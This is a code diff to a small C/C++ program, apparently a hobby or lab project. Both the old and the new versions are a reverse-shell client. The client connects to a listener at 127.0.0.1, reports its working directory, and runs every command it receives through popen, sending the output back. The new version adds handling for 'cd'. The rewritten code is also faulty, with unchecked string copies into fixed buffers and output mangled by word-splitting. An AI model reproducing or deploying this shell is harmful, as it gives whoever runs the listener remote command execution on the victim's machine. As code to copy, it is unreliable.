@@ -1,64 +1,93 @@
 #include <arpa/inet.h>
-#include <iostream>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/socket.h>
 #include <unistd.h>
 
-using namespace std;
-
-#define PORT (8080)
-#define SEP ("<SePaRaTor>")
-
-int setup_socket();
+#define PORT (3000)
+#define BUFFER_SIZE (512)
 
 int main() {
-  int client_fd = setup_socket();
-  char cmd[1024] = { 0 };
-  char cwd[256];
-  getcwd(cwd, 256);
-  send(client_fd, cwd, sizeof(cwd), 0);
-  string result = "";
-  while (true) {
-    memset(cmd, 0, sizeof(cmd));
-    int valread = read(client_fd, cmd, 1024);
-    
-    char temp_result[1024];
-    FILE *fp = popen(cmd, "r");
+  int client_fd;
+  struct sockaddr_in server_addr;
+  char buffer[BUFFER_SIZE];
+  char cwd[BUFFER_SIZE];
+  FILE *fp;
 
-    while (fgets(temp_result, sizeof(temp_result), fp) != NULL) {
-      result += temp_result;
+  client_fd = socket(AF_INET, SOCK_STREAM, 0);
+
+  if (client_fd < 0) {
+    perror("socket setfup failed\n");
+    return -1;
+  }
+
+  server_addr.sin_family = AF_INET;
+  inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr);
+  server_addr.sin_port = htons(PORT);
+
+  if (connect(client_fd, (struct sockaddr *) &server_addr,
+      sizeof(server_addr)) < 0) {
+    perror("connection failed\n");
+    return -1;
+  }
+
+  getcwd(cwd, BUFFER_SIZE);
+  if (send(client_fd, cwd, BUFFER_SIZE, 0) < 0) {
+    perror("send cwd failed");
+    return -1;
+  }
+
+  while (1) {
+    memset(buffer, 0, BUFFER_SIZE);
+    if (recv(client_fd, buffer, BUFFER_SIZE, 0) < 0) {
+      perror("recv failed\n");
+      return -1;
     }
-    getcwd(cwd, 256);
-    result += SEP;
-    result += cwd;
-    
-    send(client_fd, result.c_str(), result.length(), 0);
-  }
-  close(client_fd);
-  return 0;
-}
 
-int setup_socket() {
-  int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
-  if (socket_fd < 0) {
-    printf("socket error \n");
-    exit(EXIT_FAILURE);
-  }
- 
-  struct sockaddr_in serv_addr;
-  serv_addr.sin_family = AF_INET;
-  serv_addr.sin_port = htons(PORT);
+    if (strncmp(buffer, "cd", 2) == 0) {
+      printf("change directory\n");
+      strcpy(cwd, &buffer[3]);
+      cwd[strlen(&buffer[2])] = '\0';
+      printf("cwd: %s\n", cwd);
+      if (chdir(cwd)) {
+        perror("change directory failed");
+        return -1;
+      }
+      getcwd(cwd, BUFFER_SIZE);
+      printf("cwd: %s\n", cwd);
 
-  //convert address to binary
-  inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);
-  
-  int connect_return = connect(socket_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
-  if (connect_return < 0) {
-    printf("connection Failed \n");
-    exit(EXIT_FAILURE);
-  }
+      if (send(client_fd, buffer, BUFFER_SIZE, 0) < 0) {
+        perror("send failed");
+        return -1;
+      }
+    }
+    else {
+      if (chdir(cwd)) {
+        perror("change directory failed");
+        return -1;
+      }
+      fp = popen(buffer, "r");
+      memset(buffer, 0, BUFFER_SIZE);
+      if (!fp) {
+        perror("peopen failed");
+      }
 
-  return socket_fd;
+      while (true) {
+        char line[BUFFER_SIZE];
+        int status = fscanf(fp, "%s", line);
+        if (status != 1) {
+          break;
+        }
+        strcat(buffer, line);
+        strcat(buffer, "\n");
+      }
+
+      printf("%s\n", buffer);
+      if (send(client_fd, buffer, BUFFER_SIZE, 0) < 0) {
+        perror("send failed");
+        return -1;
+      }
+      pclose(fp);
+    }
+  }
 }
